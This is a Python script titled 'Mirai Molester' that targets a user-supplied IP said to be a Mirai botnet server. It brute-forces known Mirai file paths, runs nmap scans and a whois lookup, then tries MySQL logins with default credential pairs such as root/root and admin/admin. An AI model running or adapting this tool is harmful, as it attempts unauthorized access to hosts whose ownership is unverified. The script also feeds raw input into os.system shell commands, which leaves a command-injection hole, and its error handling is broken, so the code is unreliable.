import os
import sys
from colorama import Fore, Style
from time import sleep
import requests
import socket

os.system("clear")
print(Fore.YELLOW + "WE HATE BOTNETS!!!!!!!" + "\n" + "KILL ALL MIRAIS!!!!")
print(Fore.RED + "Mirai Molester v1 for LINUX ONLY!")
print(Fore.RED + "Made by cypress!")
print()
ip = input(Fore.GREEN + "Enter MIRAI Botnet IP: ")
if ip == "":
    print(Fore.CYAN + "Please enter an IP!")
    print(Fore.RESET)
    sys.exit()
if "." not in ip:
    print(Fore.GREEN + "This is not a valid host!")
    sys.exit()
else:
    print(Fore.RED + "Ok, we are molesting {}".format(ip))
    print()
    sleep(1)
    print("First, we will do a directory brute force, this looks for common directories where Mirai Botnet files may be located!")
    try:
        bins = "http://" + ip + "/bins"
        binss = requests.get(bins)
        binssh = "http://" + ip + "/bins.sh"
        binshh = requests.get(binssh)
        zzz = "http://" + ip + "/zzz"
        zzzz = requests.get(zzz)
        abc = "http://" + ip + "/ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        abcd = requests.get(abc)
        bmode = "http://" + ip + "/beastmode"
        bmodee = requests.get(bmode)
        lmao = "http://" + ip + "/lmaoWTF"
        lmaoo = requests.get(lmao)
        hoho = "http://" + ip + "/hoho.arm"
        hohoo = requests.get(hoho)
        usa = "http://" + ip + "/8UsA.sh"
        usaa = requests.get(usa)
        idk = "http://" + ip + "/s84j93nd3ht03w33dt/ksp4nk.arc"
        idkk = requests.get(idk)
        un = "http://" + ip + "/bins/UnHAnaAW.arm5"
        unn = requests.get(un)
        bin = "http://" + ip + "/bin"
        binn = requests.get(bin)
        whoru = "http://" + ip + "/whoareyou.x86"
        whoruu = requests.get(whoru)
        gummy = "http://" + ip + "/Gummy.arm5"
        gummyy = requests.get(gummy)
        hilix = "http://" + ip + "/Hilix"
        hilixx = requests.get(hilix)
        ab = "http://" + ip + "/AB4g5"
        abb = requests.get(ab)
        a = "http://" + ip + "/a.x86"
        aa = requests.get(a)
        kira = "http://" + ip + "/jKira.x86"
        kiraa = requests.get(kira)
        li = "http://" + ip + "/li"
        lii = requests.get(li)
        scr = "http://" + ip + "/scripts"
        scrr = requests.get(scr)
        zehir = "http://" + ip + "/zehir"
        zehirr = requests.get(zehir)
        idiot = "http://" + ip + "/SBIDIOT"
        idiott = requests.get(idiot)
        antisocial = "http://" + ip + "/Anti_Bins"
        antisociall = requests.get(antisocial)
        pandora = "http://" + ip + "/Pandoras_Box"
        pandoraa = requests.get(pandora)
        reaper = "http://" + ip + "/reaper"
        reaperr = requests.get(reaper)
        zy = "http://" + ip + "/zy"
        zyy = requests.get(zy)
        kira = "http://" + ip + "/jKira.x86"
        kiraa = requests.get(kira)
        h = "http://" + ip + "/Hilix.arm"
        hh = requests.get(h)

    except requests.exceptions.ConnectionError:
        print("Connection failed to {ip}:80")
    
    
    print(Fore.GREEN + "http://" + ip + "/bins: {}".format(binss.status_code))
    print(Fore.GREEN + "http://" + ip + "/bins.sh: {}".format(binshh.status_code))
    print(Fore.GREEN + "http://" + ip + "/zzz: {}".format(zzzz.status_code))
    print(Fore.GREEN + "http://" + ip + "/ABCDEFGHIJKLMNOPQRSTUVWXYZ: {}".format(abcd.status_code))
    print(Fore.GREEN + "http://" + ip + "/beastmode: {}".format(bmodee.status_code))
    print(Fore.GREEN + "http://" + ip + "/lmaoWTF: {}".format(lmaoo.status_code))
    print(Fore.GREEN + "http://" + ip + "/hoho.arm: {}".format(hohoo.status_code))
    print(Fore.GREEN + "http://" + ip + "/8UsA.sh: {}".format(usaa.status_code))
    print(Fore.GREEN + "http://" + ip + "/s84j93nd3ht03w33dt/ksp4nk.arc: {}".format(idkk.status_code))
    print(Fore.GREEN + "{}: {}".format(un, unn.status_code))
    print(Fore.GREEN + "{}: {}".format(bin, binn.status_code))
    print(Fore.GREEN + "{}: {}".format(whoru, whoruu.status_code))
    print(Fore.GREEN + "{}: {}".format(gummy, gummyy.status_code))
    print(Fore.GREEN + "{}: {}".format(hilix, hilixx.status_code))
    print(Fore.GREEN + "{}: {}".format(ab, abb.status_code))
    print(Fore.GREEN + "{}: {}".format(a, aa.status_code))
    print(Fore.GREEN + "{}: {}".format(kira, kiraa.status_code))
    print(Fore.GREEN + "{}: {}".format(li, lii.status_code))
    print(Fore.GREEN + "{}: {}".format(scr, scrr.status_code))
    print(Fore.GREEN + "{}: {}".format(zehir, zehirr.status_code))
    print(Fore.GREEN + "{}: {}".format(idiot, idiott.status_code))
    print(Fore.GREEN + "{}: {}".format(antisocial, antisociall.status_code))
    print(Fore.GREEN + "{}: {}".format(pandora, pandoraa.status_code))
    print(Fore.GREEN + "{}: {}".format(reaper, reaperr.status_code))
    print(Fore.GREEN + "{}: {}".format(zy, zyy.status_code))
    print(Fore.GREEN + "{}: {}".format(kira, kiraa.status_code))
    print(Fore.GREEN + "{}: {}".format(h, hh.status_code))
    print()
    print(Fore.GREEN + "Directory brute force has finished! If anything returned code 200, that means that the directory exists!")
    sleep(7)
    print()
    print(Fore.YELLOW + "We are now going to run a portscan for common Mirai Botnet ports!")
    os.system("nmap {} -p1791,45,44783,48101,37215,52869,666,42069,420,6969,1337,42070,999,1024,6789,32,19058,23231,37777,2222,9999,55555".format(ip))
    print(Fore.YELLOW + "Wow, That was fast! If any ports were open, it is a indicator of a Mirai Botnet!")
    sleep(4)
    print()
    print(Fore.WHITE + "Checking If {} has ICMP on!".format(ip))
    pingip = os.system("ping {} -c 2 > /dev/null".format(ip))
    print()
    if pingip == 0:
        print(Fore.GREEN + "ICMP is enabled and it is online!")
    else:
        print(Fore.RED + "ICMP is disabled and it could be offline!")
    print()
    print(Fore.MAGENTA + "We are now going to run a whois lookup on {}, this will reveal some info about the server!".format(ip))
    sleep(2)
    os.system("whois {}".format(ip))
    sleep(7)
    print()
    print("Ok! Now we are going to run a normal port scan on {}! This will return common ports that may be open!".format(ip))
    print()
    os.system("nmap {}".format(ip))
    print()
    print("The nmap scan has completed!")
    sleep(4)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((ip,3306))
    if result == 0:
        print("We are now going to login to the MYSQL database! This will be the last step of this process.")
        sleep(3)
        rootroot = os.system("mysql -uroot -proot -h{}".format(ip))
        roottoor = os.system("mysql -uroot -ptoor -h{}".format(ip))
        adminadmin = os.system("mysql -uadmin -padmin -h{}".format(ip))
        backup = os.system("mysql -ubackup -pbackup -h{}".format(ip))
        test = os.system("mysql -utest -ptest -h{}".format(ip))
        mana = os.system("mysql -umana -pmana -h{}".format(ip))
    else:
        print("The MYSQL database is not active, so we will not login!")
